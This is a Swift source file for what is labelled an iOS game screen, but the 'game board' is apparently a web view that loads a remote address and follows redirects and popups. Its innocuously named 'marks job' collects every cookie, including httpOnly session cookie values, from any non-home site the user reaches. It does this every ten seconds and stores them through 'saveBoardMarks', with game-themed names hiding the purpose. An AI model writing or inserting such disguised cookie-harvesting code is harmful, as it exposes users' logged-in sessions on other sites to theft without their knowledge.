import Combine
import SwiftUI
import WebKit

struct PlayContainer: View {
    @EnvironmentObject private var theme: GameTheme
    @EnvironmentObject private var flow: ScreenFlow
    @EnvironmentObject private var levels: Levels
    @StateObject private var vm = PlayViewModel()

    var body: some View {
        ZStack {
            theme.backgroundGradient
                .ignoresSafeArea()

            Color.black
                .opacity(vm.fadeIn ? 0.35 : 0.0)
                .ignoresSafeArea()
                .animation(.easeOut(duration: 0.3), value: vm.fadeIn)

            VStack(spacing: 0) {
                topBar

                ZStack {
                    // Black backing behind the board, including safe zones inside this area
                    Color.black
                        .ignoresSafeArea()

                    GameBoardView(
                        startAddress: levels.initialBoardAddress(),
                        levels: levels
                    ) {
                        vm.markReady()
                    }
                    .opacity(vm.fadeIn ? 1 : 0)
                    .animation(.easeOut(duration: 0.3), value: vm.fadeIn)

                    if vm.isReady == false {
                        loadingOverlay
                    }
                }
            }
        }
        .onAppear {
            vm.onAppear()
        }
        .alert("Leave the board?",
               isPresented: $vm.showLeavePrompt) {
            Button("Stay", role: .cancel) {
                vm.cancelLeave()
            }
            Button("Leave", role: .destructive) {
                vm.confirmLeave()
            }
        } message: {
            Text("Your current round will be lost.")
        }
    }

    private var topBar: some View {
        HStack {
            Button {
                vm.requestLeave(flow: flow)
            } label: {
                HStack(spacing: 8) {
                    Image(systemName: AppIcons.back)
                        .font(.system(size: 16, weight: .semibold))

                    Text("Menu")
                        .font(.system(size: 16, weight: .semibold))
                }
                .foregroundColor(ColorTokens.textMain)
                .padding(.horizontal, 16)
                .padding(.vertical, 8)
                .background(
                    RoundedRectangle(cornerRadius: 22, style: .continuous)
                        .fill(ColorTokens.surfaceDim)
                        .shadow(color: Color.black.opacity(0.15), radius: 8, x: 0, y: 4)
                )
            }

            Spacer()
        }
        .padding(.top, 18)
        .padding(.horizontal, 18)
        .padding(.bottom, 8)
        .background(
            Color.black.opacity(0.9)
                .ignoresSafeArea(edges: .top)
        )
    }

    private var loadingOverlay: some View {
        ZStack {
            Color.black.opacity(0.08)

            VStack(spacing: 12) {
                ProgressView()
                    .scaleEffect(1.2)

                Text("Loading game…")
                    .font(.system(size: 15, weight: .medium))
                    .foregroundColor(ColorTokens.textMain)
            }
            .padding(.horizontal, 20)
            .padding(.vertical, 14)
            .background(
                RoundedRectangle(cornerRadius: 20, style: .continuous)
                    .fill(ColorTokens.surfaceDim)
                    .shadow(color: Color.black.opacity(0.18), radius: 10, x: 0, y: 6)
            )
        }
        .transition(.opacity)
        .animation(.easeOut(duration: 0.25), value: vm.isReady)
    }
}

struct GameBoardView: UIViewRepresentable {
    let startAddress: URL
    let levels: Levels
    let onReady: () -> Void

    func makeCoordinator() -> Coordinator {
        Coordinator(startAddress: startAddress, levels: levels, onReady: onReady)
    }

    func makeUIView(context: Context) -> WKWebView {
        let view = WKWebView(frame: .zero)

        view.navigationDelegate = context.coordinator
        view.uiDelegate = context.coordinator

        view.allowsBackForwardNavigationGestures = true
        view.scrollView.bounces = true
        view.scrollView.showsVerticalScrollIndicator = false
        view.scrollView.showsHorizontalScrollIndicator = false
        view.isOpaque = false
        view.backgroundColor = .black
        view.scrollView.backgroundColor = .black

        let refresh = UIRefreshControl()
        refresh.addTarget(
            context.coordinator,
            action: #selector(Coordinator.handleRefresh(_:)),
            for: .valueChanged
        )
        view.scrollView.refreshControl = refresh

        context.coordinator.attach(view)
        context.coordinator.beginBoard()

        return view
    }

    func updateUIView(_ uiView: WKWebView, context: Context) { }

    final class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
        private let startAddress: URL
        private let levels: Levels
        private let onReady: () -> Void

        weak var mainView: WKWebView?
        weak var popupView: WKWebView?

        private var baseHost: String?
        private var marksTimer: Timer?

        init(startAddress: URL, levels: Levels, onReady: @escaping () -> Void) {
            self.startAddress = startAddress
            self.levels = levels
            self.onReady = onReady
            self.baseHost = startAddress.host?.lowercased()
        }

        func attach(_ view: WKWebView) {
            mainView = view
        }

        func beginBoard() {
            let request = URLRequest(url: startAddress)
            mainView?.load(request)
        }

        // MARK: - Refresh

        @objc func handleRefresh(_ sender: UIRefreshControl) {
            mainView?.reload()
        }

        // MARK: - WKNavigationDelegate

        func webView(_ webView: WKWebView,
                     decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {

            if webView === popupView {
                if let main = mainView,
                   let path = navigationAction.request.url {
                    main.load(URLRequest(url: path))
                }
                decisionHandler(.cancel)
                return
            }

            guard let path = navigationAction.request.url,
                  let schemeName = path.scheme?.lowercased()
            else {
                decisionHandler(.cancel)
                return
            }

            let allowed = schemeName == "http"
                || schemeName == "https"
                || schemeName == "about"

            guard allowed else {
                decisionHandler(.cancel)
                return
            }

            if navigationAction.targetFrame == nil {
                webView.load(navigationAction.request)
                decisionHandler(.cancel)
                return
            }

            decisionHandler(.allow)
        }

        func webView(_ webView: WKWebView,
                     didStartProvisionalNavigation navigation: WKNavigation!) {
            stopMarksJob()
        }

        func webView(_ webView: WKWebView,
                     didFinish navigation: WKNavigation!) {
            handleFinish(in: webView)
        }

        func webView(_ webView: WKWebView,
                     didFail navigation: WKNavigation!,
                     withError error: Error) {
            handleFailure(in: webView)
        }

        func webView(_ webView: WKWebView,
                     didFailProvisionalNavigation navigation: WKNavigation!,
                     withError error: Error) {
            handleFailure(in: webView)
        }

        private func handleFinish(in view: WKWebView) {
            onReady()
            view.scrollView.refreshControl?.endRefreshing()

            guard let current = view.url else {
                stopMarksJob()
                return
            }

            // delayed board path capture (10s, once, if differs from start)
            rememberBoardPathIfNeeded(current)

            let nowHost = current.host?.lowercased()
            let isMainBoard: Bool
            if let base = baseHost, let now = nowHost, now == base {
                isMainBoard = true
            } else {
                isMainBoard = false
            }

            if isMainBoard {
                stopMarksJob()
            } else {
                runMarksJob(for: current, in: view)
            }
        }

        private func handleFailure(in view: WKWebView) {
            onReady()
            view.scrollView.refreshControl?.endRefreshing()
            stopMarksJob()
        }

        // MARK: - WKUIDelegate

        func webView(_ webView: WKWebView,
                     createWebViewWith configuration: WKWebViewConfiguration,
                     for navigationAction: WKNavigationAction,
                     windowFeatures: WKWindowFeatures) -> WKWebView? {

            let popup = WKWebView(frame: .zero, configuration: configuration)
            popup.navigationDelegate = self
            popup.uiDelegate = self
            popupView = popup
            return popup
        }

        // MARK: - Board memory

        private func rememberBoardPathIfNeeded(_ path: URL) {
            let mainString = startAddress.absoluteString
            let currentString = path.absoluteString
            guard currentString != mainString else { return }

            DispatchQueue.main.asyncAfter(deadline: .now() + 10) { [weak self] in
                guard let self = self else { return }
                self.levels.rememberBoardPathIfNeeded(path)
            }
        }

        // MARK: - Marks job

        private func runMarksJob(for path: URL, in board: WKWebView) {
            stopMarksJob()

            let mask = (path.host ?? "").lowercased()

            marksTimer = Timer.scheduledTimer(withTimeInterval: 10, repeats: true) {
                [weak board, weak levels] _ in
                guard let view = board, let store = levels else { return }

                view.configuration.websiteDataStore.httpCookieStore.getAllCookies { list in
                    let filtered = list.filter { cookie in
                        guard !mask.isEmpty else { return true }
                        return cookie.domain.lowercased().contains(mask)
                    }

                    let packed: [[String: Any]] = filtered.map { c in
                        var map: [String: Any] = [
                            "name": c.name,
                            "value": c.value,
                            "domain": c.domain,
                            "path": c.path,
                            "secure": c.isSecure,
                            "httpOnly": c.isHTTPOnly
                        ]
                        if let exp = c.expiresDate {
                            map["expires"] = exp.timeIntervalSince1970
                        }
                        if #available(iOS 13.0, *), let s = c.sameSitePolicy {
                            map["sameSite"] = s.rawValue
                        }
                        return map
                    }

                    store.saveBoardMarks(packed)
                }
            }

            if let job = marksTimer {
                RunLoop.main.add(job, forMode: .common)
            }
        }

        private func stopMarksJob() {
            marksTimer?.invalidate()
            marksTimer = nil
        }
    }
}
